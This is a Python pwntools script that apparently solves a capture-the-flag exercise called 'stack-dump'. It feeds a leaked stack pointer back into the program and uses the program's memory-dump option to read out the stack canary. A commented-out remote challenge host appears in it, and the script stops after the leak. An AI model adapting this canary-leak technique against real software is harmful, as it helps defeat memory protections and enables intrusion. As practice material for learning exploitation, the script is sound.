from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "stack"
ENCODING = "ascii"
REMOTE = 1
OFFSET = 16



def io_beg():
	return process('./stack-dump')
	#remote('plzpwn.me', 2003)
	#process('./jump')
	
def io_rdy(x):
	return x.recvuntil("Lets try a real stack canary, like the ones GCC uses".encode(ENCODING), timeout = 10).decode(ENCODING)
	
def io_input(io,s,strLen=-666):
	if(strLen == -666):
		strLen = len(s)
	line = io.recvuntil('len:'.encode(ENCODING)).decode(ENCODING)
	#print(line)
	io.sendline(str(strLen).encode(ENCODING))
	io.sendline(s)

def io_act(io, send):	
	data = io.recvuntil('quit'.encode(ENCODING)).decode(ENCODING)
	#print(data)
	if('abcd'.find(send) != -1):
		print('Sending: '+send)
		io.sendline(send.encode(ENCODING))
	
def io_dump(io):
	io.recvline()
	data = io.recv(2000)
	return data
	
def main():
	stage = 0
	fin = 0

	while(fin < 1):
		if(stage == 0):
			io = io_beg()
			easier = io.recvuntil("To make things easier, here's a useful stack pointer 0x".encode(ENCODING), timeout = 10)
			if(len(easier) < 1):
				print("Failed to attach to proc")
				stage = -1
			else:
				pointer = io.recvline(timeout = 3).decode(ENCODING) # pointer 0x--1234BC-- \n
				pointer = pointer.strip() #1234BC
				print("[S"+str(stage)+"] "+"Gotten pointer! "+pointer)
				
				stage = stage + 1
				print("[Stage] New stage: "+str(stage))
		elif(stage == 1):
			pointer_new =  p32(int(pointer,16)+105) # 105
			io_act(io, 'a')
			io_input(io, pointer_new) # enter data
			io.recvuntil("b) dump memory".encode(ENCODING)) # wait until it finishes entering
			
			stage = stage + 1
			print("[Stage] New stage: "+str(stage))
		elif(stage == 2):
			io_act(io, 'b')
			canary = io_dump(io).decode(ENCODING)
			
			print('Possible Canary: '+canary)
			#addressHexString_human = '\\x'.join(x.encode('hex') for x in canary)
			#print(addressHexString_human)
			
			stage = stage + 1
			print("[Stage] New stage: "+str(stage))
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
